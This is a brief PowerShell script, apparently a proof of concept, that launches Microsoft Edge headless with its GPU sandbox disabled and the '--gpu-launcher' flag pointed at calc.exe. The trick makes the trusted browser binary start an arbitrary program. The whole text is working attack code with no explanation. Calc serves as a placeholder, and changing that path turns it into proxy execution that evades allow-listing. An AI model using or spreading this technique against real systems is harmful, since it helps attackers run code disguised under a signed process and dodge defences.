# Define the path to Microsoft Edge executable
$edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

# Define the arguments
$arguments = "--disable-gpu-sandbox --headless --gpu-launcher=""C:\Windows\system32\calc.exe"""

# Start Microsoft Edge with the specified arguments
Start-Process -FilePath $edgePath -ArgumentList $arguments
